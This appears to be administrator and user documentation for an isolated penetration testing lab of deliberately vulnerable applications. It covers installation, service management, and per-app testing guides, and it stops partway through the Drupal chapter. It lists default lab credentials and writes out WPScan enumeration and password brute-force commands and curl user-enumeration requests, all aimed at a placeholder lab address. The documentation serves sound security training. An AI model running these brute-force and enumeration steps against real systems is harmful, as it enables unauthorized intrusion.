
# Penetration Testing Lab - Complete Documentation

**Version:** 1.0
**Last Updated:** January 2026
**Lab IP Address:** x.x.x.x (Replace with your actual LAN IP)

---

## Table of Contents

- [Introduction](#introduction)
- [Quick Reference - Ports and Services](#quick-reference---ports-and-services)
- [PART I: Administrator Guide](#part-i-administrator-guide)
  - [Installation](#installation)
  - [Managing Services](#managing-services)
  - [Troubleshooting](#troubleshooting)
- [PART II: User Guide - Testing Environments](#part-ii-user-guide---testing-environments)
  - [Chapter 1: OWASP Juice Shop](#chapter-1-owasp-juice-shop)
  - [Chapter 2: OWASP WebGoat](#chapter-2-owasp-webgoat)
  - [Chapter 3: bWAPP (Buggy Web Application)](#chapter-3-bwapp-buggy-web-application)
  - [Chapter 4: Mutillidae II](#chapter-4-mutillidae-ii)
  - [Chapter 5: OWASP crAPI](#chapter-5-owasp-crapi)
  - [Chapter 6: WordPress (Vulnerable Configuration)](#chapter-6-wordpress-vulnerable-configuration)
  - [Chapter 7: Drupal (Vulnerable Configuration)](#chapter-7-drupal-vulnerable-configuration)
  - [Chapter 8: NGINX Static Server](#chapter-8-nginx-static-server)
  - [Chapter 9: Apache Static Server](#chapter-9-apache-static-server)
  - [Chapter 10: LocalStack (AWS Emulator)](#chapter-10-localstack-aws-emulator)
  - [Chapter 11: Kubernetes Goat](#chapter-11-kubernetes-goat)
- [Appendix A: Security Considerations](#appendix-a-security-considerations)
- [Appendix B: Additional Resources](#appendix-b-additional-resources)

---

## Introduction

This document provides comprehensive guidance for both administrators and penetration testers using this vulnerable application lab environment. The lab consists of 11 intentionally vulnerable applications and services designed for security training, penetration testing practice, and security tool validation.

### Purpose

This lab environment serves multiple purposes:
- **Security Training**: Learn to identify and exploit common web application vulnerabilities
- **Certification Preparation**: Practice for certifications like OSCP, CEH, GWAPT
- **Tool Testing**: Validate security scanning and exploitation tools
- **Red Team Practice**: Develop offensive security skills in a safe environment
- **Blue Team Training**: Understand attacks to better defend against them

### Warning

**CRITICAL SECURITY WARNING**: All services in this lab are intentionally vulnerable and MUST ONLY be run on isolated networks. Never expose these services to the internet or untrusted networks. Disconnect from the internet or use a dedicated isolated VLAN/network segment.

---

## Quick Reference - Ports and Services

| Port | Service | Access URL | Purpose |
|------|---------|------------|---------|
| 3000 | OWASP Juice Shop | http://x.x.x.x:3000 | Modern vulnerable web application (OWASP Top 10) |
| 8080 | OWASP WebGoat | http://x.x.x.x:8080/WebGoat | Interactive security training with lessons |
| 8081 | bWAPP | http://x.x.x.x:8081 | 100+ web vulnerabilities, OWASP Top 10 |
| 8087 | Mutillidae II | http://x.x.x.x:8087 | 40+ vulnerabilities with built-in hints |
| 8888 | crAPI | http://x.x.x.x:8888 | Vulnerable REST API (OWASP API Top 10) |
| 8025 | crAPI MailHog UI | http://x.x.x.x:8025 | Email testing interface for crAPI |
| 8082 | WordPress | http://x.x.x.x:8082 | CMS with vulnerable plugins/configurations |
| 8083 | Drupal | http://x.x.x.x:8083 | CMS for testing Drupal-specific vulnerabilities |
| 8085 | NGINX Static | http://x.x.x.x:8085 | Static file server for upload/download testing |
| 8086 | Apache Static | http://x.x.x.x:8086 | Apache web server for configuration testing |
| 4566 | LocalStack | http://x.x.x.x:4566 | AWS service emulator for cloud pentesting |
| 1234* | Kubernetes Goat | http://x.x.x.x:1234 | Container/K8s security scenarios |

\* *Kubernetes Goat requires manual port-forwarding (see Chapter 11)*

---

# PART I: Administrator Guide

## Installation

### Prerequisites

- Ubuntu Server 22.04 LTS (bare metal or VM)
- Minimum 8GB RAM, 50GB disk space recommended
- Root/sudo access
- Isolated network environment (CRITICAL)

### Automated Installation

The lab includes an automated installation script that handles all dependencies and service deployment.

#### Step 1: Run Installation Script

```bash
sudo bash ./1.install-vulnerable-servers.sh
```

#### Step 2: What Gets Installed

The script automatically installs and configures:

1. **System Prerequisites**
   - Docker CE and Docker Compose
   - kubectl (Kubernetes CLI)
   - kind (Kubernetes in Docker)
   - Helm (Kubernetes package manager)
   - Supporting utilities (curl, git, jq, unzip)

2. **Docker Containers**
   - All web applications run as Docker containers
   - Containers configured to bind to 0.0.0.0 (LAN accessible)
   - Automatic restart policy: `unless-stopped`

3. **Kubernetes Cluster**
   - Creates a kind cluster named "vulnlab"
   - Deploys Kubernetes Goat scenarios
   - Installs necessary RBAC roles and services

4. **Firewall Configuration**
   - Opens required ports on UFW (if enabled)
   - Ports: 3000, 8080-8083, 8085-8088, 8888, 8025, 4566

#### Step 3: Verify Installation

After installation completes, verify all services:

```bash
# Check main stack status
docker compose -f /opt/vulnlab/docker-compose.yml ps

# Check crAPI status
cd /opt/vulnlab/crapi/crAPI-develop/deploy/docker && docker compose ps

# Check Kubernetes pods
kubectl get pods -A
```

Expected output: All containers should show "Up" status, all pods should be "Running".

### Installation File Locations

- **Main compose file**: `/opt/vulnlab/docker-compose.yml`
- **crAPI directory**: `/opt/vulnlab/crapi/crAPI-develop/deploy/docker`
- **Kubernetes Goat**: `/opt/vulnlab/kubernetes-goat`
- **Static files**: `/opt/vulnlab/nginx-static`, `/opt/vulnlab/apache-static`

---

## Managing Services

### Starting and Stopping Services

#### Main Stack (Juice Shop, WebGoat, bWAPP, etc.)

```bash
# View logs
docker compose -f /opt/vulnlab/docker-compose.yml logs -f --tail=200

# Stop all services
docker compose -f /opt/vulnlab/docker-compose.yml down

# Start all services
docker compose -f /opt/vulnlab/docker-compose.yml up -d

# Restart a specific service
docker compose -f /opt/vulnlab/docker-compose.yml restart juiceshop
```

#### crAPI Management

```bash
# Navigate to crAPI directory
cd /opt/vulnlab/crapi/crAPI-develop/deploy/docker

# View logs
docker compose logs -f --tail=200

# Stop crAPI
docker compose down

# Start crAPI
LISTEN_IP="0.0.0.0" docker compose -f docker-compose.yml --compatibility up -d
```

#### Kubernetes Goat Management

```bash
# View all pods
kubectl get pods -A

# View Kubernetes Goat specific pods
kubectl get pods -n kubernetes-goat

# Delete and recreate cluster
kind delete cluster --name vulnlab
kind create cluster --name vulnlab
cd /opt/vulnlab/kubernetes-goat && bash setup-kubernetes-goat.sh
```

### Monitoring System Resources

```bash
# Check Docker container resource usage
docker stats

# Check system resources
htop
df -h
free -h
```

---

## Troubleshooting

### Common Issues

#### 1. Containers Not Starting

```bash
# Check Docker daemon status
sudo systemctl status docker

# Restart Docker service
sudo systemctl restart docker

# View container logs
docker logs <container_name>
```

#### 2. Port Conflicts

```bash
# Check what's using a port
sudo ss -tuln | grep <port_number>

# Kill process using a port
sudo fuser -k <port_number>/tcp
```

#### 3. Kubernetes Pods Stuck in Pending

```bash
# Describe pod to see events
kubectl describe pod <pod_name> -n <namespace>

# Check node resources
kubectl top nodes
```

#### 4. Cannot Access Services from LAN

```bash
# Verify firewall rules
sudo ufw status

# Check if services are bound to 0.0.0.0
sudo ss -tuln | grep -E ':(3000|8080|8081|8082|8083|8085|8086|8087|8888|8025|4566)'

# Verify LAN IP
ip -4 route get 1.1.1.1 | awk '/src/ {print $7}'
```

### Resetting Services to Default State

#### Reset Docker Services

```bash
# Stop and remove all containers, networks, volumes
docker compose -f /opt/vulnlab/docker-compose.yml down -v

# Restart fresh
docker compose -f /opt/vulnlab/docker-compose.yml up -d
```

#### Reset Kubernetes Goat

```bash
# Delete and recreate cluster
kind delete cluster --name vulnlab
kind create cluster --name vulnlab

# Re-deploy Kubernetes Goat
cd /opt/vulnlab/kubernetes-goat
bash setup-kubernetes-goat.sh
```

---

# PART II: User Guide - Testing Environments

---

## Chapter 1: OWASP Juice Shop

**Access:** http://x.x.x.x:3000
**Technology:** Node.js, Angular, SQLite
**Difficulty:** Easy to Hard

### Overview

OWASP Juice Shop is probably the most modern and sophisticated insecure web application available for security training. It encompasses vulnerabilities from the entire OWASP Top 10 along with many other security flaws found in real-world applications.

### Key Features

- **90+ Hacking Challenges**: Ranging from trivial to extremely difficult
- **Score Board**: Track your progress at `http://x.x.x.x:3000/#/score-board`
- **Hacking Instructor**: Optional tutorial mode with guided challenges
- **Modern Stack**: Single-page application with REST API backend
- **CTF Support**: Built-in CTF flag codes for competitions

### Vulnerability Coverage

Juice Shop covers vulnerabilities from multiple security frameworks:
- OWASP Top 10 (2017, 2021)
- OWASP ASVS (Application Security Verification Standard)
- OWASP Automated Threat Handbook
- OWASP API Security Top 10
- MITRE Common Weakness Enumeration (CWE)

### Common Vulnerabilities to Test

1. **SQL Injection**: Login bypass, data extraction
2. **Cross-Site Scripting (XSS)**: Reflected, Stored, DOM-based
3. **Broken Authentication**: Weak passwords, JWT manipulation
4. **Sensitive Data Exposure**: Leaked credentials, exposed files
5. **XML External Entities (XXE)**: File upload vulnerabilities
6. **Broken Access Control**: Horizontal/vertical privilege escalation
7. **Security Misconfiguration**: Exposed admin panels, debug mode
8. **Cross-Site Request Forgery (CSRF)**: State-changing operations
9. **Insecure Deserialization**: Object injection attacks
10. **Using Components with Known Vulnerabilities**: Outdated libraries

### Getting Started

1. **First Time Access**: Browse to http://x.x.x.x:3000
2. **Activate Score Board**: Find the hidden score board (hint: check common paths)
3. **Create Account**: Register a user account to test authentication
4. **Enable Hacking Instructor**: Use tutorial mode for guided learning
5. **Browse Products**: Explore the e-commerce functionality

### Recommended Testing Tools

- **Burp Suite**: Intercept and modify HTTP requests
- **OWASP ZAP**: Automated scanning and manual testing
- **Browser DevTools**: Inspect client-side code and API calls
- **sqlmap**: Automated SQL injection testing
- **nikto**: Web server scanning

### Practice Scenarios

- **Beginner**: Find the score board, access admin account, DOM XSS
- **Intermediate**: SQL injection for data exfiltration, XXE attacks, JWT token forging
- **Advanced**: Two-factor authentication bypass, NoSQL injection, prototype pollution

### References

- [OWASP Juice Shop Project](https://owasp.org/www-project-juice-shop/)
- [Official Documentation](https://pwning.owasp-juice.shop/)
- [GitHub Repository](https://github.com/juice-shop/juice-shop)

---

## Chapter 2: OWASP WebGoat

**Access:** http://x.x.x.x:8080/WebGoat
**Technology:** Java, Spring Boot
**Difficulty:** Beginner to Intermediate

### Overview

WebGoat is a deliberately insecure web application maintained by OWASP designed to teach web application security lessons. Unlike other vulnerable applications, WebGoat is structured as an interactive learning platform with lessons, hints, and immediate feedback.

### Key Features

- **Lesson-Based Learning**: Structured curriculum with progressive difficulty
- **Interactive Tutorials**: Step-by-step guidance through vulnerabilities
- **Instant Feedback**: Know immediately if your exploit worked
- **Multi-Technology Coverage**: Java-based with common frameworks
- **WebWolf Companion**: Separate inbox/landing page service (port 9090)

### Available Lessons

WebGoat organizes content into learning modules:

1. **General**
   - HTTP Basics
   - HTTP Proxies
   - Developer Tools
   - CIA Triad (Confidentiality, Integrity, Availability)

2. **Injection Flaws**
   - SQL Injection (Intro, Advanced, Mitigation)
   - Path Traversal
   - Command Injection
   - XXE (XML External Entities)

3. **Authentication Flaws**
   - Authentication Bypasses
   - JWT Tokens
   - Password Reset
   - Secure Passwords

4. **Access Control Flaws**
   - Insecure Direct Object References (IDOR)
   - Missing Function Level Access Control
   - Spoofing an Authentication Cookie

5. **Cross-Site Scripting (XSS)**
   - Stored XSS
   - Reflected XSS
   - DOM-based XSS
   - XSS Mitigation

6. **Cross-Site Request Forgery (CSRF)**

7. **Cryptography**
   - Encoding vs Encryption
   - Hashing
   - Signing

8. **Insecure Deserialization**

9. **Vulnerable Components**

10. **Client-Side Security**

### Getting Started

1. **Create Account**: Navigate to http://x.x.x.x:8080/WebGoat
2. **Register New User**: Use the "Register new user" link
3. **Start Lessons**: Begin with "General" section for HTTP basics
4. **Use Hints**: Each lesson provides hints if you get stuck
5. **Check Solutions**: Many lessons have solution walkthroughs

### Important Notes

- **WebWolf**: Some lessons require WebWolf (port 9090) - a companion service acting as a separate application for receiving requests
- **Progress Tracking**: Your progress is saved per user account
- **Lesson Order**: Follow lessons in order as they build upon each other
- **Lab Environment**: Safe to experiment - can reset database if needed

### Recommended Workflow

1. Read the lesson introduction carefully
2. Use browser DevTools to inspect requests/responses
3. Configure a proxy (Burp Suite/ZAP) for advanced lessons
4. Attempt the challenge
5. Use hints if stuck for more than 15 minutes
6. Review the solution to understand the vulnerability

### Testing Tools Integration

- **Burp Suite**: Essential for intercepting and modifying requests
- **Browser DevTools**: Inspect HTML, JavaScript, network traffic
- **Text Editor**: Some lessons require crafting payloads
- **Command Line**: cURL for sending custom HTTP requests

### References

- [OWASP WebGoat Project](https://owasp.org/www-project-webgoat/)
- [GitHub Repository](https://github.com/WebGoat/WebGoat)
- [Getting Started Guide](https://blog.razrsec.uk/getting-started-with-webgoat/)

---

## Chapter 3: bWAPP (Buggy Web Application)

**Access:** http://x.x.x.x:8081
**Technology:** PHP, MySQL
**Difficulty:** Beginner to Advanced

### Overview

bWAPP (buggy web application) is a free and open-source deliberately insecure web application. It contains over 100 web vulnerabilities covering all major known web bugs, including all risks from the OWASP Top 10 project.

### Key Features

- **100+ Vulnerabilities**: Comprehensive coverage of web security flaws
- **OWASP Top 10 Complete Coverage**: All risks from multiple years
- **Security Level Selection**: Choose low, medium, or high security
- **Bee-box Ready**: Can also be deployed as a VM
- **PHP/MySQL Stack**: Common technology stack for testing

### Default Credentials

- **Username**: `bee`
- **Password**: `bug`

### Security Levels

bWAPP offers three security levels to demonstrate both vulnerable and secure code:

1. **Low**: No security measures, easily exploitable
2. **Medium**: Some basic security, but still vulnerable
3. **High**: Proper security measures implemented

This allows you to see the difference between vulnerable and secure implementations.

### Vulnerability Categories

1. **A1 - Injection**
   - SQL Injection (GET/POST/Search/Login)
   - OS Command Injection
   - PHP Code Injection
   - Server-Side Includes (SSI) Injection
   - XML/XPath Injection
   - LDAP Injection
   - iFrame Injection

2. **A2 - Broken Authentication**
   - Broken Auth - CAPTCHA Bypassing
   - Broken Auth - Forgotten Function
   - Broken Auth - Insecure Login Forms
   - Broken Auth - Logout Management
   - Weak Passwords
   - Session Management Flaws

3. **A3 - Sensitive Data Exposure**
   - Base64 Encoding
   - Clear Text HTTP
   - Credentials over HTTP
   - Text Files

4. **A4 - XML External Entities (XXE)**

5. **A5 - Broken Access Control**
   - Directory Traversal
   - Host Header Attack
   - Insecure Direct Object Reference (IDOR)
   - Privilege Escalation
   - Remote & Local File Inclusion (RFI/LFI)
   - Restricted Folder Access

6. **A6 - Security Misconfiguration**
   - Application Configuration
   - Debug Information
   - Robots File

7. **A7 - Cross-Site Scripting (XSS)**
   - Reflected XSS
   - Stored XSS
   - DOM-based XSS
   - AJAX/JSON XSS
   - Cross-Site Flashing

8. **A8 - Insecure Deserialization**

9. **A9 - Using Components with Known Vulnerabilities**
   - Heartbleed
   - Shellshock
   - POODLE

10. **A10 - Insufficient Logging & Monitoring**

11. **Other Bugs**
    - CSRF
    - Clickjacking
    - Cross-Origin Resource Sharing (CORS)
    - Denial of Service
    - HTML Injection
    - HTTP Response Splitting
    - Session Puzzles
    - SOAP Injection

### Getting Started

1. **Access Application**: http://x.x.x.x:8081
2. **Login**: Use credentials bee/bug
3. **Select Security Level**: Start with "low" for easier exploitation
4. **Choose Vulnerability**: Select from dropdown menu
5. **Exploit**: Test the selected vulnerability
6. **Compare Levels**: Try same vulnerability on medium/high to see protections

### Testing Workflow

```
1. Select vulnerability from dropdown
2. Set security level to "low"
3. Test and exploit the vulnerability
4. Document your findings
5. Change to "medium" and try again
6. Change to "high" to see proper security
7. Compare the code differences (view source)
```

### Recommended Tools

- **Burp Suite**: HTTP interception and manipulation
- **sqlmap**: Automated SQL injection
- **dirb/dirbuster**: Directory brute-forcing
- **Metasploit**: Exploitation framework
- **Browser Extensions**: Cookie editors, header modifiers

### Practice Scenarios

- **SQL Injection**: Try all SQL injection variants (GET, POST, Search, Login)
- **File Upload**: Upload web shells and bypass filters
- **XSS**: Test reflected, stored, and DOM-based XSS
- **RFI/LFI**: Remote and local file inclusion attacks
- **Session Hijacking**: Cookie manipulation and session fixation

### References

- [Official bWAPP Website](http://www.itsecgames.com/)
- [Configuration Tutorial](https://www.hackingarticles.in/configure-web-application-penetration-testing-lab/)
- [GitHub Mirror](https://github.com/chillitray/bWAPP)

---

## Chapter 4: Mutillidae II

**Access:** http://x.x.x.x:8087
**Technology:** PHP, MySQL, JavaScript
**Difficulty:** Beginner to Advanced

### Overview

OWASP Mutillidae II is a free, open-source, deliberately vulnerable web application designed for web security training. It features over 40 vulnerabilities and challenges with built-in hints, tutorials, and video walkthroughs. Unlike some training applications, Mutillidae features actual vulnerabilities without artificial constraints.

### Key Features

- **40+ Vulnerabilities**: Real-world security flaws
- **Built-in Hints**: Integrated help system
- **Video Tutorials**: Visual learning guides
- **Multiple OWASP Top 10 Years**: Coverage from 2007, 2010, 2013, 2017
- **One-Click Reset**: Restore system to default state
- **No "Magic Strings"**: Real vulnerabilities, not simulated

### Default Credentials

Multiple user accounts are available for testing different access levels. Check the home page for current credentials.

### Security Levels

Mutillidae offers three security levels:

0. **Level 0 (Hosed)**: Completely insecure, no protections
1. **Level 1 (Client-Side Security)**: Security controls in client-side only
2. **Level 2 (Client and Server-Side Security)**: Proper security implementation

### Vulnerability Coverage

#### OWASP Top 10 Vulnerabilities

1. **Injection**
   - SQL Injection
   - JavaScript Injection
   - JSON Injection
   - LDAP Injection
   - XML Injection
   - Command Injection

2. **Broken Authentication**
   - Privilege Escalation
   - Authentication Bypass
   - Insufficient Session Expiration

3. **Sensitive Data Exposure**
   - Information Disclosure
   - Directory Browsing
   - HTML Comments
   - Unvalidated Redirects

4. **XML External Entities (XXE)**

5. **Broken Access Control**
   - Horizontal Privilege Escalation
   - Vertical Privilege Escalation
   - Insecure Direct Object Reference (IDOR)
   - Missing Authorization
   - Path Traversal

6. **Security Misconfiguration**
   - Platform Misconfiguration
   - Method Tampering
   - Application Configuration Disclosure

7. **Cross-Site Scripting (XSS)**
   - Reflected XSS
   - Stored XSS
   - DOM XSS
   - Content Spoofing

8. **Insecure Deserialization**

9. **Using Components with Known Vulnerabilities**

10. **Insufficient Logging & Monitoring**

#### Additional Vulnerabilities

- Cross-Site Request Forgery (CSRF)
- Clickjacking
- Buffer Overflow
- Denial of Service
- Local/Remote File Inclusion
- Session Management Issues
- Cryptographic Flaws

### Navigation and Features

#### Main Menu

- **OWASP Top 10**: Organized by vulnerability category
- **OWASP Web Services**: SOAP/REST API testing
- **Labs**: Practical scenarios and challenges
- **Setup**: Reset database, toggle hints, toggle security

#### Built-in Tools

1. **Hints Toggle**: Enable/disable hints for each page
2. **Security Level Toggle**: Switch between security levels
3. **Reset DB**: Restore database to initial state
4. **Show Log**: View application logs

### Getting Started

1. **Access Home Page**: http://x.x.x.x:8087
2. **Toggle Hints**: Enable hints from the menu bar
3. **Set Security Level 0**: Start with no security
4. **Select Vulnerability**: Choose from OWASP Top 10 menu
5. **Read Hints**: Use built-in guidance
6. **Watch Videos**: Access video tutorials for complex topics
7. **Practice Exploit**: Attempt the vulnerability
8. **Increase Security**: Try levels 1 and 2 to see protections

### Recommended Testing Approach

```
Phase 1: Reconnaissance
- Map the application
- Identify input points
- Check robots.txt, HTML comments

Phase 2: Vulnerability Assessment
- Test each OWASP Top 10 category
- Use built-in hints for guidance
- Document findings

Phase 3: Exploitation
- Exploit identified vulnerabilities
- Escalate privileges
- Extract sensitive data

Phase 4: Learning
- Compare security levels
- Review secure vs insecure code
- Watch video explanations
```

### Recommended Tools

- **Burp Suite**: Essential for all testing
- **OWASP ZAP**: Alternative to Burp Suite
- **sqlmap**: SQL injection automation
- **Metasploit**: Has Mutillidae-specific modules
- **Browser DevTools**: Client-side analysis

### Practice Scenarios

1. **Authentication Bypass**: Login without credentials
2. **SQL Injection**: Extract database contents
3. **XSS Chain**: Stored XSS â Session Hijacking â Account Takeover
4. **File Upload**: Upload PHP web shell
5. **CSRF**: Perform state-changing actions as victim
6. **XXE**: Read local files via XML parsing

### References

- [OWASP Mutillidae II Project](https://owasp.org/www-project-mutillidae-ii/)
- [GitHub Repository](https://github.com/webpwnized/mutillidae)
- [SANS White Paper](https://www.sans.org/white-papers/34380)

---

## Chapter 5: OWASP crAPI

**Access:** http://x.x.x.x:8888
**MailHog UI:** http://x.x.x.x:8025
**Technology:** Microservices (Node.js, Python, Java), MongoDB, PostgreSQL
**Difficulty:** Intermediate to Advanced

### Overview

crAPI (Completely Ridiculous API) is an intentionally vulnerable REST API application designed to teach API security. Unlike traditional vulnerable web applications, crAPI focuses specifically on the OWASP API Security Top 10. It simulates a modern API-driven microservices platform for a vehicle dealership.

### Key Features

- **Microservices Architecture**: Multiple interconnected services
- **Modern API Design**: RESTful APIs with JWT authentication
- **Real-World Vulnerabilities**: Based on actual bugs from Facebook, Uber, Shopify
- **OWASP API Top 10 Coverage**: All API-specific vulnerabilities
- **Email Testing**: Integrated MailHog for email functionality testing
- **Multiple Technology Stacks**: Polyglot microservices environment

### Application Structure

crAPI consists of several microservices:

1. **crapi-web**: Frontend web application
2. **crapi-identity**: User authentication and management
3. **crapi-community**: Community forum features
4. **crapi-workshop**: Vehicle service workshop
5. **crapi-chatbot**: AI chatbot (vulnerable to prompt injection)
6. **postgresdb**: PostgreSQL database
7. **mongodb**: MongoDB database
8. **mailhog**: Email testing service

### OWASP API Security Top 10 Coverage

#### API1: Broken Object Level Authorization (BOLA/IDOR)

Test scenarios:
- Access other users' vehicles
- View other users' mechanics
- Read other users' orders

#### API2: Broken Authentication

Test scenarios:
- JWT token vulnerabilities
- Weak password requirements
- Password reset flow issues

#### API3: Broken Object Property Level Authorization

Test scenarios:
- Mass assignment vulnerabilities
- Excessive data exposure in API responses

#### API4: Unrestricted Resource Consumption

Test scenarios:
- Rate limiting bypass
- Resource exhaustion attacks

#### API5: Broken Function Level Authorization

Test scenarios:
- Access admin functions as regular user
- Horizontal privilege escalation

#### API6: Unrestricted Access to Sensitive Business Flows

Test scenarios:
- Automated attacks on business logic
- Bulk operations abuse

#### API7: Server Side Request Forgery (SSRF)

Test scenarios:
- Internal network scanning via API
- Cloud metadata access

#### API8: Security Misconfiguration

Test scenarios:
- Exposed debugging endpoints
- Verbose error messages
- CORS misconfiguration

#### API9: Improper Inventory Management

Test scenarios:
- Undocumented API endpoints
- Old API versions still active

#### API10: Unsafe Consumption of APIs

Test scenarios:
- Third-party API integration issues

### Available Challenges

crAPI includes specific challenges to solve:

1. **Access details of another user's vehicle**
2. **Access another user's mechanic report**
3. **Reset another user's password**
4. **Find an API endpoint that leaks sensitive information**
5. **Find a way to get free credit**
6. **Exploit mass assignment**
7. **Bypass rate limiting**
8. **Exploit BOLA on video endpoint**
9. **Update internal video properties**
10. **SSRF attack to access internal services**
11. **JWT secret cracking**
12. **Chatbot prompt injection**

### Getting Started

1. **Access Application**: http://x.x.x.x:8888
2. **Register Account**: Create a new user account
3. **Complete Onboarding**: Add a vehicle, explore features
4. **Access MailHog**: Check http://x.x.x.x:8025 for emails
5. **Explore API**: Use DevTools Network tab to see API calls
6. **Map Endpoints**: Document all API endpoints you discover

### API Testing Methodology

```
1. Discovery Phase
   - Map all API endpoints
   - Identify authentication mechanisms
   - Document request/response formats
   - Find hidden/undocumented endpoints

2. Authentication Analysis
   - Analyze JWT tokens
   - Test token expiration
   - Check for weak secrets
   - Test password policies

3. Authorization Testing
   - Test BOLA/IDOR vulnerabilities
   - Check horizontal privilege escalation
   - Test vertical privilege escalation
   - Verify function-level access controls

4. Input Validation
   - Test for injection flaws
   - Mass assignment testing
   - Rate limiting verification
   - SSRF testing

5. Business Logic
   - Manipulate prices/credits
   - Bypass workflows
   - Test for logic flaws
```

### Recommended Tools

- **Burp Suite Professional**: API testing, Repeater, Intruder
- **Postman**: API request building and testing
- **OWASP ZAP**: Automated API scanning
- **jwt.io**: JWT token decoding
- **hashcat/John**: JWT secret cracking
- **curl/httpie**: Command-line API testing

### Key Testing Areas

#### JWT Token Analysis

```bash
# Decode JWT (use jwt.io or command line)
# Check claims: user_id, role, expiration
# Test token manipulation
# Attempt signature bypass (alg: none)
# Crack weak secrets
```

#### BOLA/IDOR Testing

```bash
# Change numeric IDs in requests
# Test UUID enumeration
# Access resources of other users
# Modify video IDs, vehicle IDs, report IDs
```

#### Rate Limiting

```bash
# Send multiple rapid requests
# Test different endpoints
# Check for bypass headers (X-Forwarded-For)
# Test distributed rate limiting
```

#### MailHog Email Testing

1. Access http://x.x.x.x:8025
2. View all emails sent by the application
3. Extract tokens from password reset emails
4. Test email-based vulnerabilities

### Practice Scenarios

1. **Challenge Path**: Work through all 12 official challenges
2. **Bug Bounty Simulation**: Treat as a bug bounty target, find all vulns
3. **API Scanning**: Use automated tools and compare results
4. **JWT Attacks**: Focus on token-based authentication vulnerabilities
5. **Microservices Testing**: Understand service-to-service communication

### References

- [OWASP crAPI Project](https://owasp.org/www-project-crapi/)
- [GitHub Repository](https://github.com/OWASP/crAPI)
- [Challenge Documentation](https://owasp.org/crAPI/docs/challenges.html)
- [Using crAPI for API Security](https://nordicapis.com/using-owasps-crapi-tool-for-api-security/)

---

## Chapter 6: WordPress (Vulnerable Configuration)

**Access:** http://x.x.x.x:8082
**Technology:** PHP, MySQL
**Difficulty:** Intermediate

### Overview

WordPress is the world's most popular content management system (CMS), powering over 40% of websites. This installation is configured with default settings and without security hardening, making it suitable for testing common WordPress vulnerabilities and misconfigurations.

### Key Features

- **CMS Testing**: Practice WordPress-specific attacks
- **Plugin/Theme Vulnerabilities**: Test common vulnerable components
- **Configuration Issues**: Default installation with weak security
- **MySQL Backend**: Database testing opportunities

### Database Connection Details

- **Database Host**: wpdb
- **Database Name**: wp
- **Database User**: wp
- **Database Password**: wp
- **Root Password**: root

### Common WordPress Vulnerabilities to Test

#### 1. User Enumeration

```bash
# Via author archives
http://x.x.x.x:8082/?author=1
http://x.x.x.x:8082/?author=2

# Via REST API
http://x.x.x.x:8082/wp-json/wp/v2/users

# Via login error messages
# Test with valid/invalid usernames
```

#### 2. XML-RPC Exploitation

```bash
# Check if enabled
curl http://x.x.x.x:8082/xmlrpc.php

# Brute force via system.multicall
# DDoS amplification
# Pingback SSRF
```

#### 3. WordPress REST API

```bash
# Enumerate users
curl http://x.x.x.x:8082/wp-json/wp/v2/users

# Enumerate posts
curl http://x.x.x.x:8082/wp-json/wp/v2/posts

# Test for unauthorized access
```

#### 4. File Upload Vulnerabilities

- Test media upload functionality
- Bypass file type restrictions
- Upload PHP web shells
- Test for unrestricted file upload

#### 5. SQL Injection

- Test plugin vulnerabilities
- Search functionality
- Custom query parameters
- Admin panel inputs

#### 6. Directory Traversal

```bash
# Exposed configuration
http://x.x.x.x:8082/wp-config.php

# Plugin vulnerabilities
# Theme file disclosure
```

#### 7. Brute Force Attacks

```bash
# wp-login.php
# wp-admin
# Use tools: wpscan, hydra, burp intruder
```

### WordPress-Specific Reconnaissance

#### Version Detection

```bash
# Check meta generator tag
curl http://x.x.x.x:8082 | grep generator

# Check readme.html
http://x.x.x.x:8082/readme.html

# WPScan
wpscan --url http://x.x.x.x:8082
```

#### Plugin Enumeration

```bash
# Manual enumeration
http://x.x.x.x:8082/wp-content/plugins/

# WPScan enumeration
wpscan --url http://x.x.x.x:8082 --enumerate p

# Check for known vulnerable plugins
```

#### Theme Enumeration

```bash
# Manual enumeration
http://x.x.x.x:8082/wp-content/themes/

# WPScan enumeration
wpscan --url http://x.x.x.x:8082 --enumerate t
```

### Recommended Tools

#### WPScan (Primary Tool)

```bash
# Basic scan
wpscan --url http://x.x.x.x:8082

# Aggressive scan with enumeration
wpscan --url http://x.x.x.x:8082 \
  --enumerate u,vp,vt,tt,cb,dbe \
  --plugins-detection aggressive

# Brute force
wpscan --url http://x.x.x.x:8082 \
  --usernames admin \
  --passwords /usr/share/wordlists/rockyou.txt
```

#### Other Tools

- **Burp Suite**: Manual testing and exploitation
- **sqlmap**: SQL injection testing
- **Metasploit**: WordPress exploit modules
- **nikto**: Web server scanning
- **dirb/gobuster**: Directory enumeration

### Getting Started

1. **Access Site**: http://x.x.x.x:8082
2. **Install WordPress**: Complete the 5-minute installation
3. **Create Admin Account**: Set up initial administrator
4. **Explore Admin Panel**: Familiarize yourself with wp-admin
5. **Run WPScan**: Perform initial reconnaissance
6. **Test Vulnerabilities**: Work through common WordPress issues

### Testing Workflow

```
1. Reconnaissance
   - Version detection
   - User enumeration
   - Plugin/theme discovery
   - Run WPScan

2. Vulnerability Assessment
   - Test XML-RPC
   - Check REST API security
   - Identify vulnerable plugins/themes
   - Test for common misconfigurations

3. Exploitation
   - Brute force admin login
   - Exploit plugin vulnerabilities
   - Upload web shells
   - SQL injection

4. Post-Exploitation
   - Database access
   - File system access
   - Privilege escalation
```

### Practice Scenarios

1. **Complete Compromise**: From reconnaissance to admin access
2. **Plugin Hunting**: Find and exploit vulnerable plugins
3. **Database Extraction**: Extract WordPress database contents
4. **Web Shell Upload**: Gain command execution
5. **Persistence**: Maintain access after compromise

### Security Testing Checklist

- [ ] User enumeration via multiple methods
- [ ] XML-RPC enabled and exploitable
- [ ] REST API information disclosure
- [ ] Weak admin credentials
- [ ] Outdated WordPress core
- [ ] Vulnerable plugins installed
- [ ] Vulnerable themes installed
- [ ] File upload restrictions
- [ ] SQL injection in plugins
- [ ] Directory listing enabled
- [ ] wp-config.php exposed
- [ ] Debug mode enabled
- [ ] Database credentials weak

### References

- [WordPress Official Site](https://wordpress.org/)
- [WPScan Documentation](https://github.com/wpscanteam/wpscan)
- [WordPress Security White Paper](https://wordpress.org/about/security/)

---

## Chapter 7: Drupal (Vulnerable Configuration)

**Access:** http://x.x.x.x:8083
**Technology:** PHP, PostgreSQL
**Difficulty:** Intermediate

### Overview

Drupal is a powerful open-source CMS used by many enterprise organizations and government websites. This installation runs Drupal 9 with default configurations and no security hardening, making it suitable for testing Drupal-specific vulnerabilities.

### Key Features

- **Enterprise CMS**: Different architecture from WordPress
- **PostgreSQL Backend**: Test database security
- **Module System**: Plugin-like architecture with security implications
- **API-First**: REST API testing opportunities

